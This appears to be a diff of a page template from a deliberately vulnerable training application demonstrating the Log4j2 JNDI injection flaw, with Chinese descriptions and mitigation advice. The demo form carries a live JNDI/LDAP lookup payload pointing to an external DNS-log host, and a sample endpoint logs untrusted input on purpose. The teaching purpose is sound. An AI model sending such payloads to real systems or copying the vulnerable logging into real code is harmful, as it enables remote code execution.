@@ -11,48 +11,60 @@
         <!-- 侧边栏 -->
         <div th:replace="~{commons/commons::siderbar(active='log4j.html')}"></div>
 
-        <main role="main" class="col-md-9 ml-sm-auto col-lg-10 pt-3 px-4">
-            <div class="vul_header">
-                <span>组件漏洞 - Log4j2反序列化</span>
-            </div>
-            <hr>
-            <ul class="nav nav-tabs">
-                <li class="nav-item">
-                    <a class="nav-link active" data-toggle="tab" href="#aa"><span class="lnr lnr-bug"></span> 漏洞描述</a>
-                </li>
-                <li class="nav-item">
-                    <a class="nav-link" data-toggle="tab" href="#bb"><span class="lnr lnr-bullhorn"></span> 安全编码</a>
-                </li>
-            </ul>
-
-            <div class="tab-content">
-                <div class="tab-pane dec shadow-sm p-3 mb-4 rounded active" id="aa">
-                    Apache Log4j2是一款优秀的Java日志框架。此次漏洞是由 Log4j2 提供的lookup功能造成的，该功能允许开发者通过一些协议去读取相应环境中的配置。但在处理数据时，并未对输入（如${jndi）进行严格的判断，从而造成JNDI注入
+        <main role="main" class="col-md-10 offset-md-2 pt-3 main">
+            <div class="card">
+                <div class="card-header py-1">
+                    <div class="vul_header">
+                        <span>组件漏洞 - Log4j2反序列化</span>
+                    </div>
                 </div>
-                <div class="tab-pane fade" id="bb">
-                    <textarea disabled="disabled" class="form-control shadow-sm p-3 mb-5 rounded" id="coder" style="height: 110px;">
-【对于第三方依赖组件，需要及时更新版本
-                    </textarea>
+                <div class="card-body">
+                    <ul class="nav nav-tabs">
+                        <li class="nav-item">
+                            <a class="nav-link active" data-toggle="tab" href="#vulDescription">
+                                漏洞描述</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" data-toggle="tab" href="#secureCoding"> 安全编码</a>
+                        </li>
+                    </ul>
+
+                    <div class="tab-content">
+                        <div class="tab-pane active" id="vulDescription">
+                            <div class="alert alert-desc"><i class="lnr lnr-alarm"></i>
+                                Apache Log4j2是一款优秀的Java日志框架。此次漏洞是由 Log4j2
+                                提供的lookup功能造成的，该功能允许开发者通过一些协议去读取相应环境中的配置。但在处理数据时，并未对输入（如${jndi）进行严格的判断，从而造成JNDI注入。
+                            </div>
+                        </div>
+                        <div class="tab-pane fade" id="secureCoding">
+                            <div class="alert alert-desc">
+                                <li>【必须】版本更新</li>
+                                对于第三方依赖组件，需要及时更新版本
+                            </div>
+                        </div>
+                    </div>
+
                 </div>
             </div>
-
-            <hr>
 
             <div class="box-float">
                 <div class="float1">
                     <h5><span class="lnr lnr-bug"> 漏洞代码</span></h5>
-                    <form role="search" th:action="@{/Log4j/vul}" method="post">
+                    <form role="search" th:action="@{/vulnapi/Log4j/vul}" method="post">
                         <div class="input-group mb-3">
-                            <input type="text" class="form-control" name="q" value="${jndi:ldap://vul.s8egdg.dnslog.cn/test}" style="color: #b5babb">
+                            <input type="text" class="form-control" name="q"
+                                   value="${jndi:ldap://vul.s8egdg.dnslog.cn/test}" style="color: #b5babb">
                             <div class="input-group-append">
-                                <button class="btn btn-sm btn-danger" type="submit">搜索</button>
+                                <button class="btn btn-sm btn-danger" type="submit">Run</button>
                             </div>
                         </div>
                     </form>
 
                     <textarea class="form-control" id="code1">
-// log4j-core < 2.15.0-rc1
-
+/**
+ * Log4j2 低版本存在远程代码执行
+ */
+@PostMapping(value = "/vul")
 public String vul(String content) {
     logger.error(content);
     return "Log4j2 RCE";
@@ -64,9 +76,9 @@ public String vul(String content) {
                 <div class="float2">
 
                     <h5><span class="lnr lnr-smile"> 安全配置</span></h5>
-                    <textarea class="form-control" id="code2">
+                    <label for="code2"> </label><textarea class="form-control" id="code2">
 方案一、升级版本
-    升级Apache Log4j所有相关应用到>= Log4j-2.15.0官方稳定版本
+    升级Apache Log4j所有相关应用到最新版本
 方案二、临时缓解（选其一）
     ● 版本>=2.10.0， 修改jvm参数，添加-Dlog4j2.formatMsgNoLookups=true
     ● 版本>=2.10.0， 代码中配置System.setProperty("log4j2.formatMsgNoLookups", "true")，重新打包jar包
